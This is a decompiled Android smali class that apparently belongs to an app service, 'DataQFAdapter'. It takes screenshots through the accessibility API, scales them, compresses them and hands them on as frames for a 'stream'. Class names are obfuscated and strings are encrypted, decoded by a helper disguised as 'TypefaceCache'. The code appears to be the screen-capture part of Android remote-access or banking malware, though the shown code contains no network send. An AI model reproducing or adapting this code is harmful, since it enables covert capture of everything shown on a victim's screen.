.class public final Lv/s/WbI2W97lldWeFi5i54;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;


# instance fields
.field public final synthetic dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

.field public final synthetic w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;


# direct methods
.method public constructor <init>(Lapp/mobilex/plus/services/DataQFAdapter;Lv/s/deLJ4Z0aL3hcJ3O1;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    iput-object p2, p0, Lv/s/WbI2W97lldWeFi5i54;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 5
    .line 6
    iput-object p1, p0, Lv/s/WbI2W97lldWeFi5i54;->w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final onFailure(I)V
    .locals 2

    .line 1
    const/16 v0, 0x1

    .line 2
    if-ne p1, v0, :cond_0

    .line 3
    .line 4
    const-string p1, "000A0058006F00A200C2009100F3008B001C0053006900B500DF008D009200EF04710428040C04DB04AE04E9048F04F90063042B040E04A500B0049F048204F004030423047304D204AD04E704FD00EE"

    .line 5
    .line 6
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    goto/16 :goto_0

    .line 10
    :cond_0
    const-string v0, "001600780050008900FF00A800DC00E7002600640049008800E200FF009A"

    .line 11
    .line 12
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 13
    .line 14
    .line 15
    move-result-object v0

    .line 16
    new-instance v1, Ljava/lang/StringBuilder;

    .line 17
    .line 18
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 19
    .line 20
    .line 21
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 22
    .line 23
    .line 24
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 25
    .line 26
    .line 27
    const-string p1, ")"

    .line 28
    .line 29
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 30
    .line 31
    .line 32
    :goto_0
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 33
    .line 34
    .line 35
    const-string p1, "003700770050008200C300BC00C000A2002600780048008F00FF00AB009200810002005F007700A200D400E50092"

    .line 36
    .line 37
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    iget-object p1, p0, Lv/s/WbI2W97lldWeFi5i54;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 41
    .line 42
    if-eqz p1, :cond_1

    .line 43
    .line 44
    const/16 v0, 0x0

    .line 45
    invoke-interface {p1, v0}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 46
    .line 47
    .line 48
    :cond_1
    return-void
.end method

.method public final onSuccess(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
    .locals 9

    .line 1
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 2
    .line 3
    .line 4
    const-string v0, "003700770050008200C300BC00C000A2002600780048008F00FF00AB0092009400160055007800A200C3008C0093"

    .line 5
    .line 6
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    const/16 v0, 0x0

    .line 10
    :try_start_0
    invoke-static {p1}, Lv/s/VhkhkItRHoue;->ibVTtJUNfrGYbW(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/hardware/HardwareBuffer;

    .line 11
    .line 12
    .line 13
    move-result-object v1
    :try_end_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_9
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_8
    .catchall {:try_start_0 .. :try_end_0} :catchall_8

    .line 14
    :try_start_1
    invoke-static {p1}, Lv/s/VhkhkItRHoue;->Ee8d2j4S9Vm5yGuR(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/graphics/ColorSpace;

    .line 15
    .line 16
    .line 17
    move-result-object p1

    .line 18
    invoke-static {v1, p1}, Lv/s/JW3Lh9hxwLsO2ArTlH;->vekpFI4d1Nc4fakF(Landroid/hardware/HardwareBuffer;Landroid/graphics/ColorSpace;)Landroid/graphics/Bitmap;

    .line 19
    .line 20
    .line 21
    move-result-object p1
    :try_end_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1 .. :try_end_1} :catch_7
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_6
    .catchall {:try_start_1 .. :try_end_1} :catchall_7

    .line 22
    if-nez p1, :cond_1

    .line 23
    .line 24
    :try_start_2
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 25
    .line 26
    .line 27
    const-string v2, "00340064005A009700D800BE00C000A3003400770049008200D200AA00D400A100260064001B009500F500AB00C700B5002D0073005F00C700FE00AA00DE00AB"

    .line 28
    .line 29
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 30
    .line 31
    .line 32
    iget-object v2, p0, Lv/s/WbI2W97lldWeFi5i54;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 33
    .line 34
    if-eqz v2, :cond_0

    .line 35
    .line 36
    invoke-interface {v2, v0}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 37
    .line 38
    .line 39
    goto/16 :goto_2

    .line 40
    :catchall_0
    move-exception v2

    .line 41
    move-object/from16 v3, v2

    .line 42
    move-object/from16 v2, v0

    .line 43
    goto/16 :goto_c

    .line 44
    .line 45
    :catch_0
    move-exception v2

    .line 46
    move-object v3, v0

    .line 47
    :goto_0
    move-object/from16 v4, v3

    .line 48
    goto/16 :goto_8

    .line 49
    .line 50
    :catch_1
    move-exception v2

    .line 51
    move-object/from16 v3, v0

    .line 52
    :goto_1
    move-object v4, v3

    .line 53
    goto/16 :goto_a

    .line 54
    .line 55
    :cond_0
    :goto_2
    invoke-virtual {v1}, Landroid/hardware/HardwareBuffer;->close()V
    :try_end_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 56
    .line 57
    .line 58
    :try_start_3
    invoke-virtual {v1}, Landroid/hardware/HardwareBuffer;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 59
    .line 60
    .line 61
    :catchall_1
    return-void

    .line 62
    :cond_1
    :try_start_4
    sget-object v2, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    .line 63
    .line 64
    const/4 v3, 0x0

    .line 65
    invoke-virtual {p1, v2, v3}, Landroid/graphics/Bitmap;->copy(Landroid/graphics/Bitmap$Config;Z)Landroid/graphics/Bitmap;

    .line 66
    .line 67
    .line 68
    move-result-object v2
    :try_end_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 69
    :try_start_5
    sget-object v3, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 70
    .line 71
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 72
    .line 73
    .line 74
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getStreamWidth$cp()I

    .line 75
    .line 76
    .line 77
    move-result v3

    .line 78
    sget v4, Lv/s/QmLUFJ3vXstIdpO2wk;->dDIMxZXP1V8HdM:I

    .line 79
    .line 80
    sget v4, Lv/s/QmLUFJ3vXstIdpO2wk;->dDIMxZXP1V8HdM:I

    .line 81
    .line 82
    invoke-static {v4}, Lv/s/Y9mRyRdkl5FOcwb66V6;->J0zjQ7CAgohuxU20eCW6(I)I

    .line 83
    .line 84
    .line 85
    move-result v4

    .line 86
    const/16 v5, 0x1

    .line 87
    if-eqz v4, :cond_4

    .line 88
    .line 89
    if-eq v4, v5, :cond_3

    .line 90
    .line 91
    const/16 v6, 0x2

    .line 92
    if-ne v4, v6, :cond_2

    .line 93
    .line 94
    const/16 v4, 0x118

    .line 95
    .line 96
    goto/16 :goto_3

    .line 97
    :cond_2
    new-instance v3, Lv/s/Sb7Xj3N9U1DQ;

    .line 98
    .line 99
    invoke-direct {v3}, Ljava/lang/RuntimeException;-><init>()V

    .line 100
    .line 101
    .line 102
    throw v3

    .line 103
    :cond_3
    const v4, 0x1e0

    .line 104
    .line 105
    goto/16 :goto_3

    .line 106
    :cond_4
    const/16 v4, 0x2d0

    .line 107
    .line 108
    :goto_3
    if-le v3, v4, :cond_5

    .line 109
    .line 110
    move v3, v4

    .line 111
    :cond_5
    invoke-virtual {v2}, Landroid/graphics/Bitmap;->getHeight()I

    .line 112
    .line 113
    .line 114
    move-result v4

    .line 115
    int-to-float v4, v4

    .line 116
    invoke-virtual {v2}, Landroid/graphics/Bitmap;->getWidth()I

    .line 117
    .line 118
    .line 119
    move-result v6

    .line 120
    int-to-float v6, v6

    .line 121
    div-float/2addr v4, v6

    .line 122
    int-to-float v6, v3

    .line 123
    mul-float/2addr v4, v6

    .line 124
    float-to-int v4, v4

    .line 125
    invoke-static {v2, v3, v4, v5}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    .line 126
    .line 127
    .line 128
    move-result-object v3
    :try_end_5
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4
    .catchall {:try_start_5 .. :try_end_5} :catchall_6

    .line 129
    :try_start_6
    sget-object v4, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 130
    .line 131
    sget-boolean v4, Lv/s/vbdyByOHPJmeGXlq;->D5P1xCAyuvgF:Z

    .line 132
    .line 133
    if-eqz v4, :cond_6

    .line 134
    .line 135
    sget v4, Lv/s/QmLUFJ3vXstIdpO2wk;->dDIMxZXP1V8HdM:I

    .line 136
    .line 137
    const/16 v5, 0x3

    .line 138
    if-eq v4, v5, :cond_6

    .line 139
    .line 140
    iget-object v4, p0, Lv/s/WbI2W97lldWeFi5i54;->w9sT1Swbhx3hs:Lapp/mobilex/plus/services/DataQFAdapter;

    nop

    .line 141
    .line 142
    invoke-static {v4, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->access$enhanceContrast(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;

    .line 143
    .line 144
    .line 145
    move-result-object v3

    .line 146
    goto :goto_4

    .line 147
    :catchall_2
    move-exception v0

    nop

    nop

    .line 148
    move-object/from16 v8, v3

    .line 149
    move-object v3, v0

    .line 150
    move-object/from16 v0, v8

    .line 151
    goto/16 :goto_c

    .line 152
    .line 153
    :catch_2
    move-exception v4

    .line 154
    move-object v8, v3

    .line 155
    move-object/from16 v3, v2

    .line 156
    move-object/from16 v2, v4

    nop

    nop

    .line 157
    move-object v4, v8

    .line 158
    goto/16 :goto_8

    .line 159
    .line 160
    :catch_3
    move-exception v4

    .line 161
    move-object v8, v3

    .line 162
    move-object v3, v2

    .line 163
    move-object/from16 v2, v4

    .line 164
    move-object/from16 v4, v8

    .line 165
    goto/16 :goto_a

    .line 166
    .line 167
    :cond_6
    :goto_4
    new-instance v4, Ljava/io/ByteArrayOutputStream;

    .line 168
    .line 169
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getStreamWidth$cp()I

    .line 170
    .line 171
    .line 172
    move-result v5

    .line 173
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getStreamWidth$cp()I

    .line 174
    .line 175
    .line 176
    move-result v6

    .line 177
    mul-int/2addr v5, v6

    .line 178
    div-int/lit8 v5, v5, 0x4

    .line 179
    .line 180
    invoke-direct {v4, v5}, Ljava/io/ByteArrayOutputStream;-><init>(I)V

    .line 181
    .line 182
    .line 183
    sget-boolean v5, Lv/s/vbdyByOHPJmeGXlq;->D5P1xCAyuvgF:Z

    .line 184
    .line 185
    if-eqz v5, :cond_7

    .line 186
    .line 187
    const/16 v5, 0x46

    .line 188
    .line 189
    goto/16 :goto_5

    .line 190
    :cond_7
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getStreamQuality$cp()I

    .line 191
    .line 192
    .line 193
    move-result v5

    .line 194
    const/16 v6, 0xa

    .line 195
    .line 196
    const/16 v7, 0x64

    .line 197
    .line 198
    invoke-static {v5, v6, v7}, Lv/s/OFtLBiBbrrTHWu;->xDyLpEZyrcKVe0(III)I

    .line 199
    .line 200
    .line 201
    move-result v5

    .line 202
    :goto_5
    sget v6, Landroid/os/Build$VERSION;->SDK_INT:I

    nop

    .line 203
    .line 204
    const/16 v7, 0x1e

    .line 205
    .line 206
    if-lt v6, v7, :cond_8

    .line 207
    .line 208
    invoke-static {}, Lv/s/VhkhkItRHoue;->JXn4Qf7zpnLjP5()Landroid/graphics/Bitmap$CompressFormat;

    .line 209
    .line 210
    .line 211
    move-result-object v6

    .line 212
    invoke-virtual {v3, v6, v5, v4}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 213
    .line 214
    .line 215
    goto/16 :goto_6

    .line 216
    :cond_8
    sget-object v6, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    .line 217
    .line 218
    invoke-virtual {v3, v6, v5, v4}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 219
    .line 220
    .line 221
    :goto_6
    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    .line 222
    .line 223
    .line 224
    move-result-object v5

    .line 225
    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->close()V

    .line 226
    .line 227
    .line 228
    iget-object v4, p0, Lv/s/WbI2W97lldWeFi5i54;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 229
    .line 230
    if-eqz v4, :cond_9

    .line 231
    .line 232
    invoke-interface {v4, v5}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_3
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2
    .catchall {:try_start_6 .. :try_end_6} :catchall_2

    .line 233
    .line 234
    .line 235
    :cond_9
    if-eqz v3, :cond_a

    .line 236
    .line 237
    :try_start_7
    invoke-virtual {v3}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    .line 238
    .line 239
    .line 240
    :catchall_3
    :cond_a
    :try_start_8
    invoke-virtual {v2}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_4

    .line 241
    .line 242
    .line 243
    :catchall_4
    :try_start_9
    invoke-virtual {p1}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_5

    .line 244
    .line 245
    .line 246
    :catchall_5
    if-eqz v1, :cond_13

    .line 247
    .line 248
    :goto_7
    :try_start_a
    invoke-virtual {v1}, Landroid/hardware/HardwareBuffer;->close()V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_10

    .line 249
    .line 250
    .line 251
    goto/16 :goto_b

    .line 252
    .line 253
    :catchall_6
    move-exception v3

    .line 254
    goto/16 :goto_c

    .line 255
    .line 256
    :catch_4
    move-exception v3

    .line 257
    move-object/from16 v4, v3

    .line 258
    move-object v3, v2

    .line 259
    move-object v2, v4

    nop

    .line 260
    move-object/from16 v4, v0

    .line 261
    goto :goto_8

    .line 262
    :catch_5
    move-exception v3

    .line 263
    move-object/from16 v4, v3

    .line 264
    move-object v3, v2

    .line 265
    move-object/from16 v2, v4

    .line 266
    move-object v4, v0

    .line 267
    goto/16 :goto_a

    .line 268
    .line 269
    :catchall_7
    move-exception v2

    .line 270
    move-object p1, v0

    .line 271
    move-object/from16 v3, v2

    .line 272
    move-object v2, p1

    .line 273
    goto/16 :goto_c

    .line 274
    .line 275
    :catch_6
    move-exception v2

    nop

    nop

    .line 276
    move-object p1, v0

    .line 277
    move-object v3, p1

    .line 278
    goto/16 :goto_0

    nop

    .line 279
    .line 280
    :catch_7
    move-exception v2

    nop

    nop

    .line 281
    move-object p1, v0

    .line 282
    move-object v3, p1

    .line 283
    goto/16 :goto_1

    .line 284
    .line 285
    :catchall_8
    move-exception v2

    .line 286
    move-object p1, v0

    .line 287
    move-object v1, p1

    .line 288
    move-object/from16 v3, v2

    .line 289
    move-object v2, v1

    .line 290
    goto/16 :goto_c

    nop

    nop

    .line 291
    .line 292
    :catch_8
    move-exception v2

    .line 293
    move-object p1, v0

    .line 294
    move-object v1, p1

    .line 295
    move-object/from16 v3, v1

    .line 296
    goto/16 :goto_0

    .line 297
    .line 298
    :goto_8
    :try_start_b
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 299
    .line 300
    .line 301
    const-string v5, "001000750049008200F500B100C100AF002C0062001B009700E200B000D100A200300065001B008200E200AD00DD00B500790036"

    .line 302
    .line 303
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 304
    .line 305
    .line 306
    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 307
    .line 308
    .line 309
    iget-object v2, p0, Lv/s/WbI2W97lldWeFi5i54;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 310
    .line 311
    if-eqz v2, :cond_b

    .line 312
    .line 313
    invoke-interface {v2, v0}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_9

    .line 314
    .line 315
    .line 316
    goto :goto_9

    .line 317
    :catchall_9
    move-exception v2

    .line 318
    move-object v0, v3

    .line 319
    move-object v3, v2

    .line 320
    move-object/from16 v2, v0

    .line 321
    move-object/from16 v0, v4

    .line 322
    goto :goto_c

    .line 323
    :cond_b
    :goto_9
    if-eqz v4, :cond_c

    .line 324
    .line 325
    :try_start_c
    invoke-virtual {v4}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_a

    .line 326
    .line 327
    .line 328
    :catchall_a
    :cond_c
    if-eqz v3, :cond_d

    .line 329
    .line 330
    :try_start_d
    invoke-virtual {v3}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_b

    .line 331
    .line 332
    .line 333
    :catchall_b
    :cond_d
    if-eqz p1, :cond_e

    .line 334
    .line 335
    :try_start_e
    invoke-virtual {p1}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_c

    .line 336
    .line 337
    .line 338
    :catchall_c
    :cond_e
    if-eqz v1, :cond_13

    .line 339
    .line 340
    goto/16 :goto_7

    .line 341
    :catch_9
    move-exception v2

    .line 342
    move-object p1, v0

    nop

    .line 343
    move-object v1, p1

    .line 344
    move-object/from16 v3, v1

    .line 345
    goto/16 :goto_1

    .line 346
    .line 347
    :goto_a
    :try_start_f
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 348
    .line 349
    .line 350
    const-string v5, "000C0059007600C700F900B1009200B400200064005E008200FE00AC00DA00A80037002C001B"

    nop

    nop

    .line 351
    .line 352
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 353
    .line 354
    .line 355
    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 356
    .line 357
    .line 358
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 359
    .line 360
    .line 361
    iget-object v2, p0, Lv/s/WbI2W97lldWeFi5i54;->dDIMxZXP1V8HdM:Lv/s/deLJ4Z0aL3hcJ3O1;

    .line 362
    .line 363
    if-eqz v2, :cond_f

    .line 364
    .line 365
    invoke-interface {v2, v0}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_9

    .line 366
    .line 367
    .line 368
    :cond_f
    if-eqz v4, :cond_10

    .line 369
    .line 370
    :try_start_10
    invoke-virtual {v4}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_d

    .line 371
    .line 372
    .line 373
    :catchall_d
    :cond_10
    if-eqz v3, :cond_11

    .line 374
    .line 375
    :try_start_11
    invoke-virtual {v3}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_e

    .line 376
    .line 377
    .line 378
    :catchall_e
    :cond_11
    if-eqz p1, :cond_12

    .line 379
    .line 380
    :try_start_12
    invoke-virtual {p1}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_12
    .catchall {:try_start_12 .. :try_end_12} :catchall_f

    .line 381
    .line 382
    .line 383
    :catchall_f
    :cond_12
    if-eqz v1, :cond_13

    .line 384
    .line 385
    goto/16 :goto_7

    .line 386
    .line 387
    :catchall_10
    :cond_13
    :goto_b
    return-void

    .line 388
    :goto_c
    if-eqz v0, :cond_14

    .line 389
    .line 390
    :try_start_13
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_11

    .line 391
    .line 392
    .line 393
    :catchall_11
    :cond_14
    if-eqz v2, :cond_15

    .line 394
    .line 395
    :try_start_14
    invoke-virtual {v2}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_14
    .catchall {:try_start_14 .. :try_end_14} :catchall_12

    .line 396
    .line 397
    .line 398
    :catchall_12
    :cond_15
    if-eqz p1, :cond_16

    .line 399
    .line 400
    :try_start_15
    invoke-virtual {p1}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_15
    .catchall {:try_start_15 .. :try_end_15} :catchall_13

    .line 401
    .line 402
    .line 403
    :catchall_13
    :cond_16
    if-eqz v1, :cond_17

    .line 404
    .line 405
    :try_start_16
    invoke-virtual {v1}, Landroid/hardware/HardwareBuffer;->close()V
    :try_end_16
    .catchall {:try_start_16 .. :try_end_16} :catchall_14

    .line 406
    .line 407
    .line 408
    :catchall_14
    :cond_17
    throw v3
.end method
